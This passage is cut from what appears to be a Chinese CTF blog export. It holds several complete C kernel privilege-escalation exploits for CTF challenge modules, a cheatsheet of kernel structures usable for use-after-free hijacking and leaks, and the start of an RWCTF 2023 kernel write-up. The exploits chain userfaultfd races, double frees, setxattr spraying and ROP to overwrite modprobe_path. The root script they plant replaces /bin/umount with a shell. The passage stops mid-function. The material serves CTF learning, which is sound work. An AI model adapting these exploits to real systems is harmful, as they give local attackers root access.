UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\n\nvoid cmd_push(uint64_t* arg){\n    ioctl(fd_kstack,0x57AC0001,arg);\n}\n\nvoid cmd_pop(uint64_t* arg){\n    ioctl(fd_kstack,0x57ac0002,arg);\n}\n\nvoid* push_thread(){\n    ioctl(fd_kstack,0x57AC0001,fault_addr);\n}\n\nvoid prepare_seq_operations(){\n    int i = 0;\n    for(i = 0; i < 50; i++){\n        fd_seq[i] = open(\"/proc/self/stat\",0);\n    }\n\n    for(i = 0; i < 50; i++){\n        close(fd_seq[i]);\n    }\n\n    memset(fd_seq,0,0x50);\n}\n\nvoid prepare(){ \n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\\n\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo 'chmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(10);                          \n        system(\"/tmp/dummy\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nint main(){\n    uint64_t ret_value = 0;\n    prepare();\n\n    fd_kstack = open(\"/proc/stack\",2);\n\n// set userfaultfd\n    fault_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr, userfaultfd_leak_handler);\n\n// leak kernel_base\n    prepare_seq_operations();           // spray kernel addr in heap-0x20\n    pthread_t thr_push,thr_pop;\n    pthread_create(&thr_push, NULL, push_thread, 0);        // stop at copy_from_user\n    sleep(1);\n    cmd_pop(&ret_value);        // kfree\n    kernel_base = ret_value - single_stop_off;\n    printf(\"kernel_base: 0x%lx\\n\",kernel_base);\n    add_rsp_0x1f8_ret += kernel_base;\n\n\n// control rip\n    int i = 0;\n    char* buf = malloc(0x20);\n    // for(i = 0; i < 50; i++){\n    //     fd_seq[i] = open(\"/proc/self/stat\",0);\n    // }\n    fd_seq[0] = open(\"/proc/self/stat\",0);\n    sleep(5);\n    temp_fd = fd_seq[0];\n    modprobe_path_addr += kernel_base;\n    pop_rdx_rdi_ret += kernel_base;\n    pop_rsi_ret += kernel_base;\n    mov_qp_rdx_rdi_ret += kernel_base;\n    do_task_dead += kernel_base;\n    // read(fd_seq[0],buf,0x20);\n\n    __asm__(\n        \"mov r15, 0x15151515;\"     // r15\n        \"mov r14, 0x14141414;\"      // r14 /tmp/x\n        \"mov r13, pop_rdx_rdi_ret;\"      // r13\n        \"mov r12, modprobe_path_addr;\"      // r12\n        \"mov r11, 0x11111111;\"\n        \"mov r10, mov_qp_rdx_rdi_ret;\"      // r10\n        \"mov rbp, 0x782f706d742f;\"      // bbbbbbbb\n        \"mov rbx, pop_rsi_ret;\"      // aaaaaaaa\n        \"mov r9, do_task_dead;\"       // r9\n        \"mov r8, 0x88888888;\"       //r8\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x22222222;\"\n        \"mov rsi, 0x33333333;\"\n        \"mov rdi, temp_fd;\"\n        \"syscall\"\n    );\n    // for(i = 0; i < 50; i++){\n    //     read(fd_seq[i],buf,0x20);\n    //     printf(\"[+]index : %d done!\",i);\n    // }\n    \n    return 0;\n\n}\n```\n\n效果如下：\n\n![image-20230228232415377](image-20230228232415377.png?size=600)\n\n\n\n\n\n### exp2\n\n> 通过double free 构造任意地址写，直接写modprobe_path\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <poll.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <sys/xattr.h>\n#include <linux/userfaultfd.h>\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n#define BZIMAGE_ADDR 0xFFFFFFFF81000000\n\nint fd_kstack = 0;\nuint64_t kernel_base = 0;\nchar* fault_addr;\nchar* fault_addr2;\nchar* fault_addr3;\nchar* fault_addr4;\nuint64_t fd_seq[0x50] = {0};\n\nuint64_t single_stop_off = 0xFFFFFFFF8113BE80 - BZIMAGE_ADDR;\n\nuint64_t modprobe_path_addr = 0xFFFFFFFF81C2C541 - BZIMAGE_ADDR;\nuint64_t pop_rdx_rdi_ret = 0xffffffff8122dd4b - BZIMAGE_ADDR;\nuint64_t pop_rsi_ret = 0xffffffff81047a8e - BZIMAGE_ADDR;\nuint64_t mov_qp_rdx_rdi_ret = 0xffffffff8121216f - BZIMAGE_ADDR;\nuint64_t do_task_dead = 0xFFFFFFFF8106EBB0 - BZIMAGE_ADDR;\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_sleep3_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(3);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n\n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid* userfaultfd_pause_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    pause();\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid cmd_push(uint64_t* arg){\n    ioctl(fd_kstack,0x57AC0001,arg);\n}\n\nvoid cmd_pop(uint64_t* arg){\n    ioctl(fd_kstack,0x57ac0002,arg);\n}\n\nvoid* push_thread(void* addr){\n    ioctl(fd_kstack,0x57AC0001,addr);\n}\n\nvoid* pop_thread(void* addr){\n    ioctl(fd_kstack,0x57AC0002,addr);\n}\n\nvoid* setxattr_thread(void* addr){\n    setxattr(\"/exp\",\"bling\",addr,0x20,0);\n}\n\nvoid prepare_seq_operations(){\n    int i = 0;\n    for(i = 0; i < 80; i++){\n        fd_seq[i] = open(\"/proc/self/stat\",0);\n    }\n\n    for(i = 0; i < 59; i++){\n        close(fd_seq[i]);\n    }\n\n    memset(fd_seq,0,0x50);\n}\n\nvoid prepare(){ \n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\\n\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo 'chmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(20);                          \n        system(\"/tmp/dummy\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nint main(){\n    uint64_t ret_value = 0;\n    prepare();\n\n    fd_kstack = open(\"/proc/stack\",2);\n\n// set userfaultfd\n    fault_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr, userfaultfd_sleep3_handler);\n\n// leak kernel_base\n    printf(\"[+] leaking kernel base address\\n\");\n    prepare_seq_operations();           // spray kernel addr in heap-0x20\n    pthread_t thr_push;\n    pthread_create(&thr_push, NULL, push_thread, fault_addr);        // stop at copy_from_user\n    sleep(1);\n    cmd_pop(&ret_value);                    // kfree\n    kernel_base = ret_value - single_stop_off;\n    printf(\" kernel_base: 0x%lx\\n\",kernel_base);\n\n    sleep(3);\n\n// double free\n    printf(\"[+] creating double free\\n\");\n    fault_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr, userfaultfd_pause_handler);\n    fault_addr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr2, userfaultfd_sleep3_handler);\n    fault_addr3 = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr3+0x1000, userfaultfd_pause_handler);\n    fault_addr4 = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr4+0x1000, userfaultfd_pause_handler);\n\n    *(uint64_t*)(fault_addr3+0x1000-0x8) = modprobe_path_addr + kernel_base;            // aaw: target address\n    *(uint64_t*)(fault_addr4+0x1000-0x8) = 0x782f706d742f;                              // aaw: value - \"/tmp/x\"\n\n    pthread_t thr_pause,thr_pop;\n    pthread_create(&thr_pause, NULL, push_thread, fault_addr);      // kmalloc\n    sleep(1);\n    pthread_create(&thr_pop, NULL, pop_thread, fault_addr2);        // first kfree\n    sleep(1);\n    cmd_pop(&ret_value);       // double kfree\n\n    sleep(3);\n\n// malloc back\n    printf(\"[+] arbitrary write\\n\");\n    pthread_t setxattr1,setxattr2,setxattr3;\n    pthread_create(&setxattr1, NULL, setxattr_thread, fault_addr3+0x1000-0x8);\n    sleep(1);\n    pthread_create(&setxattr2, NULL, setxattr_thread, fault_addr3+0x1000-0x8);\n                            // 不知道为什么，在这个期间，总是会有一个do_fork()的调用？？？导致modprobe_path那个块被提前占用了。\n    close(fd_seq[59]);      // 所以，增加一个kfree 0x20大小堆块的操作\n    sleep(1);\n    pthread_create(&setxattr3, NULL, setxattr_thread, fault_addr4+0x1000-0x8);\n    sleep(1);       // 这里要sleep 1s，给线程一点时间将modprobe_path写完\n    for(int i = 60; i < 80; i++){\n        close(fd_seq[i]);               // 防止后续申请0x20大小堆块时系统崩溃\n    }\n\n    pause();\n}\n```\n\n\n\n### exp3\n\n> 跟exp2的区别在如何malloc回double free的堆块，这里先用seq_operations结构体占住堆块，再用\"setxattr+userfaultfd\"覆盖seq_operations->start指针，完成控制流劫持。最后使用ptregs+ROP修改modprobe_path提权。\n\n```c\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n#include <ctype.h>\n#include <sys/xattr.h>\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n#define BZIMAGE_ADDR 0xFFFFFFFF81000000\n\nint fd_kstack = 0;\nuint64_t kernel_base = 0;\nchar* fault_addr;\nchar* fault_addr2;\nchar* fault_addr3;\nuint64_t fd_seq[0x50] = {0};\nuint64_t temp_fd = 0;\n\nuint64_t single_stop_off = 0xFFFFFFFF8113BE80 - BZIMAGE_ADDR;\n\nuint64_t modprobe_path_addr = 0xFFFFFFFF81C2C541 - BZIMAGE_ADDR;\nuint64_t add_rsp_0x1f8_ret = 0xffffffff814d51c0 - BZIMAGE_ADDR;\nuint64_t pop_rdx_rdi_ret = 0xffffffff8122dd4b - BZIMAGE_ADDR;\nuint64_t pop_rsi_ret = 0xffffffff81047a8e - BZIMAGE_ADDR;\nuint64_t mov_qp_rdx_rdi_ret = 0xffffffff8121216f - BZIMAGE_ADDR;\nuint64_t do_task_dead = 0xFFFFFFFF8106EBB0 - BZIMAGE_ADDR;\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_sleep3_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(3);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid* userfaultfd_pause_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    pause();\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\n\nvoid cmd_push(uint64_t* arg){\n    ioctl(fd_kstack,0x57AC0001,arg);\n}\n\nvoid cmd_pop(uint64_t* arg){\n    ioctl(fd_kstack,0x57ac0002,arg);\n}\n\nvoid* push_thread(){\n    ioctl(fd_kstack,0x57AC0001,fault_addr);\n}\n\nvoid* pop_thread(void* addr){\n    ioctl(fd_kstack,0x57AC0002,addr);\n}\n\nvoid* setxattr_thread(void* addr){\n    setxattr(\"/exp\",\"bling\",addr,0x20,0);\n}\n\nvoid prepare_seq_operations(){\n    int i = 0;\n    for(i = 0; i < 80; i++){\n        fd_seq[i] = open(\"/proc/self/stat\",0);\n    }\n\n    for(i = 0; i < 50; i++){\n        close(fd_seq[i]);\n    }\n\n    memset(fd_seq,0,0x50);\n}\n\nvoid prepare(){ \n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\\n\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo 'chmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(20);                          \n        system(\"/tmp/dummy\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nint main(){\n    uint64_t ret_value = 0;\n    prepare();\n\n    fd_kstack = open(\"/proc/stack\",2);\n\n// set userfaultfd\n    fault_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr, userfaultfd_sleep3_handler);\n\n// leak kernel_base\n    prepare_seq_operations();           // spray kernel addr in heap-0x20\n    pthread_t thr_push;\n    pthread_create(&thr_push, NULL, push_thread, 0);        // stop at copy_from_user\n    sleep(1);\n    cmd_pop(&ret_value);        // kfree\n    kernel_base = ret_value - single_stop_off;\n    printf(\"kernel_base: 0x%lx\\n\",kernel_base);\n\n    sleep(3);\n\n// double free\n    printf(\"[+] creating double free\\n\");\n    fault_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr, userfaultfd_pause_handler);\n    fault_addr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr2, userfaultfd_sleep3_handler);\n    fault_addr3 = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(fault_addr3+0x1000, userfaultfd_pause_handler);\n    *(uint64_t*)(fault_addr3+0x1000-0x8) = add_rsp_0x1f8_ret + kernel_base;  \n\n    pthread_t thr_pause,thr_pop;\n    pthread_create(&thr_pause, NULL, push_thread, fault_addr);      // kmalloc\n    sleep(1);\n    pthread_create(&thr_pop, NULL, pop_thread, fault_addr2);        // first kfree\n    sleep(1);\n    cmd_pop(&ret_value);       // double kfree\n\n    sleep(3);\n\n// malloc UAF 0x20 to seq_operations\n    fd_seq[0] = open(\"/proc/self/stat\",0);\n    sleep(1);\n// malloc UAF 0x20 to write first 8 bytes\n    pthread_t thr_setxattr;\n    pthread_create(&thr_setxattr, NULL, setxattr_thread, fault_addr3+0x1000-0x8);\n    sleep(3);\n\n// trigger\n    for(int i = 50; i < 80; i++){\n        close(fd_seq[i]);                   // double free破坏了0x20大小的堆，防止后续申请出错，free一些正常堆块上去\n    }\n\n    temp_fd = fd_seq[0];\n\n    modprobe_path_addr += kernel_base;\n    pop_rdx_rdi_ret += kernel_base;\n    pop_rsi_ret += kernel_base;\n    mov_qp_rdx_rdi_ret += kernel_base;\n    do_task_dead += kernel_base;\n\n    __asm__(\n        \"mov r15, 0x15151515;\"     // r15\n        \"mov r14, 0x14141414;\"      // r14 \n        \"mov r13, pop_rdx_rdi_ret;\"      // r13\n        \"mov r12, modprobe_path_addr;\"      // r12\n        \"mov r11, 0x11111111;\"\n        \"mov r10, mov_qp_rdx_rdi_ret;\"      // r10\n        \"mov rbp, 0x782f706d742f;\"      // bbbbbbbb     /tmp/x\n        \"mov rbx, pop_rsi_ret;\"      // aaaaaaaa\n        \"mov r9, do_task_dead;\"       // r9\n        \"mov r8, 0x88888888;\"       //r8\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x22222222;\"\n        \"mov rsi, 0x33333333;\"\n        \"mov rdi, temp_fd;\"\n        \"syscall\"\n    );\n\n    return 0;\n}\n```\n\n","tags":["kernel pwn"],"categories":["CTF"]},{"title":"Linux 内核漏洞利用 cheatsheet","url":"/2023/02/15/230215-linux-kernel-exploit-cheatsheet/","content":"\n# 从利用角度看内核结构体（更新中...）\n\n以常见的UAF为例，内核漏洞利用过程中，涉及到的组件比较多。而每个人的理解都不尽相同，导致描述时常常存在歧义或者交流起来比较费劲。所以以我对内核pwn的理解（master wang指导🐶），画了一张图，方便看到这篇文章的人明白我的表述。\n\n![image-20230215181840479](image-20230215181840479.png?size=600)\n\n这张图从上往下分为用户态和内核态，从左到右分为漏洞侧和利用侧，后两个概念的定义如下：\n\n- **漏洞侧**：`漏洞ko` + `UAF堆块`。漏洞多出现在 `漏洞ko` 对已free的内核堆块进行读/写/释放。\n- **利用侧**：`exp` + `UAF堆块`。利用多是让`exp`通过syscall占用`漏洞ko` free的堆块（不同结构体），达到控制流劫持/信息泄露的目的。\n\n可见，对内核UAF漏洞的利用是`漏洞ko`（漏洞侧）和`exp`（利用侧）之间基于同一个堆块的复杂交互过程。\n\n\n\n## 控制流劫持\n\n当 `漏洞ko` 仅有 “UAF写” 功能时，让 `exp` 通过某个系统调用在内核创建一个某种大小的结构体，并占用住`UAF堆块`。接下来，通过 “UAF写” 覆盖结构体中的函数指针，就可以达到控制流劫持的目的。\n\n下表列出了当前已知的可以控制流劫持的结构体：\n\n| 结构体          | 大小                 | ko漏洞点 | 利用效果   | 写偏移                                                     |\n| --------------- | -------------------- | -------- | ---------- | ---------------------------------------------------------- |\n| tty_struct      | 0x2e0 (kmalloc-1024) | UAF写    | 控制流劫持 | 0x18指向函数指针列表                                       |\n| seq_operations  | 0x20 (kmalloc-32)    | UAF写    | 控制流劫持 | 0x0处函数指针                                              |\n| subprocess_info | 0x60 (kmalloc-128)   | UAF写    | 控制流劫持 | 0x50处函数指针（race）                                     |\n| pipe_buffer     | 0x280 (kmalloc-1024) | UAF写    | 控制流劫持 | 0x10指向函数指针列表                                       |\n| tty_ldisc_ops   | 0xa8(kmalloc-192)    | UAF写    | 控制流劫持 | 0x38处函数指针，[ref](https://xz.aliyun.com/t/11053#toc-5) |\n\n\n\n## 信息泄露\n\n信息泄露有两种情况：\n\n- 一种是利用 “UAF写” 改变 `exp` 对应内核结构体的内容（如改变内容指针或内容大小）。从而在 `exp` 再次读取其内容时达到任意地址读/越界读的效果。\n- 另一种是利用\"UAF读\" 直接泄露 `exp` 对应内核结构体中的内容（如堆地址/内核地址）。\n\n### UAF写\n\n可用于 \"UAF写\" 利用的结构体如下：\n\n| 结构体           | 大小               | ko漏洞点 | 利用效果          | 写偏移                                                   |\n| ---------------- | ------------------ | -------- | ----------------- | -------------------------------------------------------- |\n| ld_struct        | 0x10（kmalloc-16） | UAF写    | 越界读/任意地址读 | 0x0：指向数据区，0x8：大小                               |\n| msg_msg          | 非固定             | UAF写    | 越界读/任意地址读 | 0x30：第一段数据区，0x20：指向下一段数据区；0x18：总大小 |\n| user_key_payload | 非固定             | UAF写    | 越界读            | 0x18：开始是数据区，0x10：大小(2byte)                    |\n\n\n\n### UAF读\n\n可用于 \"UAF读\" 利用的结构体如下：\n\n| 结构体          | 大小                        | ko漏洞点 | 利用效果        | 读偏移                                   |\n| --------------- | --------------------------- | -------- | --------------- | ---------------------------------------- |\n| tty_struct      | 0x2e0 (kmalloc-1024)        | UAF读    | 泄露堆/内核地址 | 堆：0x8/0x10(multiple)；内核：0x18/0x2d0 |\n| seq_operations  | 0x20 (kmalloc-32)           | UAF读    | 泄露内核地址    | 内核：0x0/0x8/0x10/0x18                  |\n| subprocess_info | 0x60 (kmalloc-128)          | UAF读    | 泄露堆/内核地址 | 堆：0x8/0x30；内核：0x18/0x48/0x50/      |\n| pipe_buffer     | 0x280 (kmalloc-1024)        | UAF读    | 泄露内核地址    | 内核：0x10                               |\n| shm_file_data   | 0x20 (kmalloc-32)           | UAF读    | 泄露堆/内核地址 | 堆：0x10；内核：0x8/0x18                 |\n| msg_msg         | 0x31~0x1000 (>= kmalloc-64) | UAF读    | 泄露堆          | 堆：0x20/0x28                            |\n| timerfd_ctx     | 0xf0 (kmalloc-256)          | UAF读    | 泄露堆/内核地址 | 堆：0x30；内核：0x28                     |\n\n\n\n## 特殊结构体\n\n记录一些暂时无法归类的特殊结构体，\n\n（1）cred结构体：只能用于老版本，新版本为cred申请堆的方式变了。暂未确定从哪个版本开始不能用该方法。\n\n| 结构体 | 大小               | ko漏洞点 | 利用效果 | 偏移            |\n| ------ | ------------------ | -------- | -------- | --------------- |\n| cred   | 0xa8 (kmalloc-192) | UAF写    | root提权 | 0x4-0x20全写成0 |\n\n","tags":["kernel pwn"],"categories":["CTF"]},{"title":"RWCTF 2023 PWN digging into kernel 3","url":"/2023/02/06/230206-rwctf2023-digging-into-kernel-3/","content":"\n\n最近在学习linux内核漏洞利用，正好rwctf体验赛有一道传统内核pwn，于是就在网上找了三个不同的exp分别学习了一下，把这道题的三种解题方法结合我自己的理解汇总成了这篇博客。\n\n# 题目分析\n\n[题目附件](Digging-into-Kernel-3_25360e599be77075b1fe4809749bedaf.tar.gz)\n\n逆向分析rwctf.ko，关注 `rwmod_ioctl()`函数。它包含两个分支`0xC0DECAFE`和`0xDEADBEEF`，前者释放内存，后者申请内存并从用户态拷贝数据到内核。\n\n![image-20230205231035704](image-20230205231035704.png?size=600)\n\n这里有个漏洞：`kfree()`释放内存后，未清空`buf[]`全局数组中的指针，导致UAF。\n\n# 利用方法1\n\n本题的利用分两个阶段：\n\n- 首先关掉KASLR，实现控制流劫持\n- 然后开启KASLR，泄露出内核地址\n- 最后整合成一个完整的exp\n\n## 关闭KASLR\n\n为了便于调试，先在qemu启动命令中关掉KASLR，打控制流劫持。\n\n利用思路：\n\n- 先使用seq_operations结构体占用ko释放的堆块。这个结构体可以打控制流劫持，使用相对简单。\n- 再利用UAF更改这个堆块的内容（函数指针）。通过ko `kfree`此堆块，紧接着又 `kmalloc` 该堆块并写入内容。\n- 最后通过 `read()` 触发函数指针，劫持rip。\n\n劫持rip后，利用ROP改modprobe_path的内容，实现以root用户执行任意命令（如`chmod 777 /flag`），是比较方便获取flag的方式。\n\n该步骤的代码如下，编译命令`gcc test.c -static -masm=intel -o exp`。\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <sys/syscall.h>\n#include <time.h>\n#include <stdint.h>\n\nstruct rwstruct{\n    unsigned int idx;\n    unsigned int size;\n    char* cont;\n};\n\nint g_fd;\nint seq_fd;\nint64_t seq_read_buf[4];\n\nint64_t kernel_elf_base = 0xFFFFFFFF81000000;\nint64_t pop_rax_ret = 0xffffffff81000ddb;\nint64_t pop_rdi_ret = 0xffffffff8106ab4d;\nint64_t mov__rdi__rax_ret = 0xffffffff81074e3c; // mov qword ptr [rdi], rax ; xor eax, eax ; jmp 0xffffffff82003240;\nint64_t do_task_dead_func = 0xFFFFFFFF810A3190;\nint64_t modprobe_path_addr = 0xFFFFFFFF828510A0;\nint64_t add_rsp_170_ret = 0xffffffff819d9f4c;\nint64_t pop_rbp_ret = 0xffffffff810679ef;\n\nint rwctf_ioctl_kmalloc(int idx, int size, char* cont){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = size;\n    rw_buf.cont = cont;\n    ioctl(g_fd,0xDEADBEEF,&rw_buf);\n}\n\nint rwctf_ioctl_kfree(int idx){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = 0;\n    rw_buf.cont = 0;\n    ioctl(g_fd,0xC0DECAFE,&rw_buf);\n}\n\nvoid prepare(){ \n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\" > /bin/umount\\nchmod 777 /bin/umount\\nchmod 777 /flag' > /tmp/x\");\n    // system(\"echo -n '#!/bin/sh\\n/bin/sh' > /tmp/getshell\");\n    // system(\"echo '#!/bin/sh\\n' > /tmp/x\");\n    // system(\"echo 'rm -rf /bin/umount\\n' >> /tmp/x\");\n    // system(\"echo 'mv /tmp/getshell /bin/umount\\n' >> /tmp/x\");\n    // system(\"echo 'chmod 777 /bin/umount\\n' >> /tmp/x\");\n    // system(\"echo '#!/bin/sh\\nchmod 777 /flag' > /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(3);                           // 需要在这个间隙中，将modprobe_path改成/tmp/x\n        system(\"/tmp/dummy 2>/dev/null\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nvoid hijack(){\n    int OBJ_SIZE = 